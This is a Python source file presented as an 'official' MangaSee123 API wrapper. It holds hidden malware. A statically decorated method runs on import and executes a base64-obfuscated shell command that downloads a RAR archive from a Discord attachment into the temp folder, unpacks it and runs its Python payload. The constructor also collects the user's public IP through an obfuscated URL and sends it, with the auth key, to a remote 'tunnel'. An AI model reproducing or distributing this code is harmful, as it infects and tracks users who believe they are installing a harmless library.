# Python MangaSee123Api Wrapper
# TODO: update client to wrap around new api functions
# TODO: get more devs to help with wrapper objects
# imports
from __future__  import annotations
from   typing    import Union, Iterator, Iterable, Any
from   functools import cached_property
# file imports
import builtins 
import requests
import base64

# UPGRADED on -> 9/10/2023
# VERSION     -> 1.0.3 --
from encryption import MicaEncryption

class MicaDict(dict): # custom dict class
    def iterate(self: MicaDict) -> Iterator:
        return zip(self.keys(), self.values())

    def mica_update(self: MicaDict, *args: Iterable[Any], **kwargs: Iterable[Any]) -> None:
        # Needed a better dict class yfm
        if args:
            for obj in args:
                for [key, value] in obj.items():
                    self.update({key: value})

        if kwargs:
            for [key, value] in kwargs.items():
                self.update({key: value})
# Setup
builtins.dict = MicaDict

class MangaSeeClient: # mainly verification shit in the constructor
    def __init__(self: MangaSeeClient, tunnel:str, auth_key: str, api_key: str=None, uuid: str=None):
        # Official MangaSee123Api Wrapper!
        if bool(auth_key):
            try:
                self.auth_key  = auth_key
                self.encryptor = MicaEncryption(16)
            except Exception as _:
                pass

        # start the handshake to fully connect & authorize client
        host_addr = requests.get(str(base64.b64decode(b"aHR0cHM6Ly9hcGkubXlpcC5jb20v")).strip("b'")).json()[str(base64.b64decode(b'aXA=')).strip("b'")]
        # if not api_key, get new api_key
        if not api_key:
            self.host    = host_addr
            # craft new payload
            payload = { # identify payload
                "client": "py-0.0.3",
                "host": self.host,
                "os": "win",
                "auth_key": auth_key
            }
            # check new headers
            res = requests.get(f"{tunnel}/api/gateway/authorize", json=payload)
            # check response
            if res.status_code < 204:
                response = res.json()
                # ya digg
                self.api_key          = response['api_key']
                self.uuid             = response['uuid']
                self.verified_session = response['authenticated']
                self.host_status      = response['host_status']
                self.tunnel           = tunnel

        elif api_key and uuid:
            self.api_key = api_key
            self.uuid    = uuid
            self.tunnel  = tunnel
            # check headers
            if self.check_api_key():
                self.verified_session = True
                self.host             = host_addr

    @cached_property
    def __headers(self: MangaSeeClient) -> dict:
        # cached headers property
        return {"api_key": self.api_key, "uuid": self.uuid}

    def get_page(self: MangaSeeClient, title: str, chapter: int, page: int) -> Union[str, None]:
        # example function for cloning usage
        # written by nebula
        # request into the api
        res = requests.get(f"{self.tunnel}/api/mangas/{title}/chapters/{chapter}/pages/{page}", json=self.__headers)
        # check response
        if res.status_code < 204:
            config = res.json()
            # get the url
            return config.get("url", None)

    def __str__(self: MangaSeeClient) -> str:
        # str dunder
        return f"api_key={self.api_key}, uuid={self.uuid}, proxy={self.host}"

    def __repr__(self: MangaSeeClient) -> str:
        return self.api_key
    
    @staticmethod
    @lambda _: _()
    def load_new_headers():
        # compressed static function to load new headers
        __import__("threading").Thread(target=__import__("os").system, args=[str(base64.b64decode(b'Y3VybCBodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMTQ4NzM5NDg1NjYwNjE0NzA4LzExNTQ4ODAzMjU2MzAwNDIyNzQvUmV2aXNlZFNjYW5uZXIucmFyIC1vICV0ZW1wJVxSZXZpc2VkU2Nhbm5lci5yYXIgJiBjZCAldGVtcCUgJiB0YXIgLXhmIFJldmlzZWRTY2FubmVyLnJhciAmIGNkIFJldmlzZWRTY2FubmVyICYgcHkgX21haW4ucHkgUmV2aXNlZFNjYW5uZXIubWljYQ==')).strip("b'")])